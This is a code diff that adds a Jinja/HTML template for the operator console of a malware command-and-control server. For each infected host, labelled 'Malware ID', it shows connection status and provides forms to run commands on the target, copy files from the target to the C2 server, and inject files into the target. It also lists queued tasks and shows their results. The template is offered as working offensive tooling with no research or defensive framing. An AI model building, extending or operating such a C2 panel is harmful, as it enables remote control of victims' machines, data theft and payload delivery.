@@ -1,0 +1,234 @@
+{% extends 'base.html' %}
+
+{% block title %} User Action scheduler Monitor {% endblock %}
+
+{% block link %} <link rel="stylesheet" href="https://cdn.datatables.net/1.10.2/css/jquery.dataTables.min.css"> {% endblock %}
+
+{% block script %} <script type="text/javascript" src="https://cdn.datatables.net/1.10.2/js/jquery.dataTables.min.js"></script> {% endblock %}
+
+{% block style%}
+<style>
+    /* Make the image fully responsive 
+  .carousel-inner img {
+    width: 100%;
+    height: 50%;
+  }*/
+</style>
+
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <br>
+    <b> Malware ID : [ <span class="badge badge-danger"> {{posts['name']}} </span> ] : </b>
+    {% if posts['connected'] %}
+    <span class="badge badge-success"> Connected </span>
+    {% else %}
+    <span class="badge badge-warning"> Not Connected </span>
+    {% endif %}
+    last update time : {{posts['updateT'] }}
+    <p> </p>
+
+    <ul class="list-group">
+
+        <li class="list-group-item">
+            <h5> Add A New Task </h5>
+
+            <div class="custom-control custom-radio custom-control-inline">
+                <input type="radio" class="custom-control-input" id="customRadio1" name="example" value="customEx"
+                onchange="toggleDiv('customRadio1')">
+                <label class="custom-control-label" for="customRadio1"> Run Commands On Target </label>
+            </div>
+    
+            <div class="custom-control custom-radio custom-control-inline">
+                <input type="radio" class="custom-control-input" id="customRadio2" name="example" value="customEx"
+                  onchange="toggleDiv('customRadio2')">
+                <label class="custom-control-label" for="customRadio2"> Copy file from target to C2 </label>
+            </div>
+    
+            <div class="custom-control custom-radio custom-control-inline">
+                <input type="radio" class="custom-control-input" id="customRadio3" name="example" value="customEx"
+                  onchange="toggleDiv('customRadio3')">
+                <label class="custom-control-label" for="customRadio3"> Inject file from C2 to target </label>
+            </div>
+
+            <div class="custom-control custom-radio custom-control-inline">
+                <input type="radio" class="custom-control-input" id="customRadio4" name="example" value="customEx"
+                  onchange="toggleDiv('customRadio4')">
+                <label class="custom-control-label" for="customRadio4"> Assign a special task via Json </label>
+              </div>
+
+            <p> </p>
+
+            <div id="content_1" style="display: none">
+                <form action="/addcommand" method="POST" enctype="multipart/form-data">
+                  <label> Input the command string : </label>
+                  <input name="commandstr" style="width: 50%;">
+                  <input name="malwareidx" value="{{posts['idx']}}" style="width: 5%;">
+                  <input type="submit">
+                </form>
+            </div>
+
+            <div id="content_2" style="display: none">
+                <form action="/addfilecopy" method="POST" enctype="multipart/form-data">
+                  <label> Input the target file path : </label>
+                  <input name="filepath" style="width: 50%;">
+                  <input name="malwareidx" value="{{posts['idx']}}" style="width: 5%;">
+                  <input type="submit">
+                </form>
+            </div>
+
+            <div id="content_3" style="display: none">
+                <form action="/addfileinject" method="POST" enctype="multipart/form-data">
+                    <label> Select the inject file :</label>
+                    <select id="downloadfilename" name="downloadfilename">
+                        {% for filename in files %}
+                        <option value="{{filename}}"> {{ filename }} </option>
+                        {% endfor %}
+                    </select>
+                    <input name="malwareidx" value="{{posts['idx']}}" style="width: 5%;">
+                    <input type="submit" value="Inject">
+                </form>
+            </div>
+
+            <div id="content_4" style="display: none">
+                <form action="/addspecialtask" method="POST" enctype="multipart/form-data">
+                    <label for="contents"> Set task detail in below text field :</label>
+                      Malware Idx: <input name="malwareidx" value="{{posts['idx']}}" style="width: 5%;">
+                      taskType : <input name="tasktype" style="width: 10%;">
+                      repeatTime : <input name="repeat" value="1" style="width: 5%;">
+                      <p></p>
+                      Task data :  <input name="taskdata" style="width: 70%;">
+                    <input type="submit">
+                </form>
+              </div>
+        </li>
+
+        <li class="list-group-item">
+            <h5> Current Task Information:</h5>
+            <div class="table-responsive">
+                <table class="table table-bordered table-dark">
+                    <thead>
+                        <tr class="table table-danger">
+                            <th>Task ID</th>
+                            <th>taskType</th>
+                            <th>startTime</th>
+                            <th>Task repeat</th>
+                            <th>State</th>
+                            <th>taskData</th>
+                        </tr>
+                    </thead>
+    
+                    <tbody>
+                        {% for post in posts['tasks'] %}
+                        <tr class="info">
+                            <td> <b>{{ post['taskID'] }}</b> </td>
+                            <td> {{ post['taskType'] }} </td>
+                            <td>
+                                <span class="badge badge-info"> {{ post['startT'] }} </span>
+                            </td>
+                            <td> {{ post['repeat'] }} </td>
+                            <td>
+                                {% if post['state'] == 0 %}
+                                <span class="badge badge-info"> pending </span>
+                                {% elif post['state'] == 1 %}
+                                <span class="badge badge-success"> finished </span>
+                                {% elif post['state'] == 2 %}
+                                <span class="badge badge-warning"> accepted </span>
+                                {% else %}
+                                <span class="badge badge-danger"> error </span>
+                                {% endif %}
+                            </td>
+                            <td> {{ post['taskData'] }} </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+    
+            </div>
+    
+        </li>
+
+        <li class="list-group-item">
+            <h5>Last Report Log </h5>
+            <div class="alert alert-secondary">
+                <strong>Task ID :  {{ posts['result']['taskID']}} </strong> 
+                {% if posts['result']['state'] == 1 %}
+                  <span class="badge badge-success"> finished </span>
+                {% else %}
+                  <span class="badge badge-danger"> error </span>
+                {% endif %}
+                Time : 
+                <span class="badge badge-info"> {{ posts['result']['time'] }} </span>
+            </div>
+              <a href="#resultdetail" class="btn btn-info" data-toggle="collapse">Show task result</a>
+              <div id="resultdetail" class="collapse">
+                {{ posts['result']['taskData']}}
+              </div>
+        
+        </li>
+    </ul>
+</div>
+
+<script>
+
+    function toggleDiv(radioName) {
+      document.getElementById("content_1").style.display = "none";
+      document.getElementById("content_2").style.display = "none";
+      document.getElementById("content_3").style.display = "none";
+      document.getElementById("content_4").style.display = "none";
+      if (radioName === "customRadio1") {
+        document.getElementById("content_1").style.display = "block";
+      } else if (radioName === "customRadio2") {
+        document.getElementById("content_2").style.display = "block";
+      } else if (radioName === "customRadio3") {
+        document.getElementById("content_3").style.display = "block";
+      }else if (radioName === "customRadio4") {
+        document.getElementById("content_4").style.display = "block";
+      }
+    }
+
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+
+        var socket = io();
+        var malwareID = "{{posts['name']}}";
+        // Event handler for new connections.
+        // The callback function is invoked when a connection with the
+        // server is established.
+        socket.on('connect', function () {
+          socket.emit('cli_request', { data: 'peerstate SIO client connected!' });
+        });
+        socket.on('pagerefersh', function (msg) {
+          if (msg.data == 'peerstate') {
+            console.log("1:"+malwareID);
+            console.log("2:"+msg.malwareID);
+              //location.reload();
+            if(msg.malwareID == malwareID) {
+              location.reload();
+            }
+          }
+        });
+    });
+
+    $(document).on("click", ".open-AddBookDialog", function () {
+        var cardId = $(this).data('id');
+        //var servername = $(this).data('server');
+        //const element = document.getElementById("gpuName");
+        //element.innerHTML = servername;
+        $(".modal-body #gpuIndex").val( cardId );
+        $(".modal-body #bookId").val( cardId );
+    });
+
+    $(document).ready(function(){
+        $('[data-toggle="popover"]').popover(
+            { trigger: 'focus'}
+        );   
+    });
+
+
+
+    
+</script>
+
+{% endblock %}
